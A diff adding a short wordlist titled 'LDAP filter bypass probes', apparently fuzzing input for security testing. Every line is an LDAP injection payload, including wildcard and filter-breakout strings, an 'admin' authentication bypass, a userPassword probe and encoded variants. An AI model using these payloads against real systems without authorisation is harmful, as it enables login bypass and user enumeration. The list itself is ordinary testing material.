@@ -1,0 +1,17 @@
+# LDAP filter bypass probes
+*
+*)
+*)(
+)(cn=*)
+(|(cn=*))
+(&(cn=*))
+admin*
+admin)(|(cn=*))
+*)(uid=*))(|(uid=*
+)(objectClass=*)
+(|(uid=*)(mail=*))
+(&(uid=admin)(userPassword=*))
+%2a
+%29%28%7c%28cn%3d%2a%29%29
+\2a
+\29\28|\28cn=\2a\29
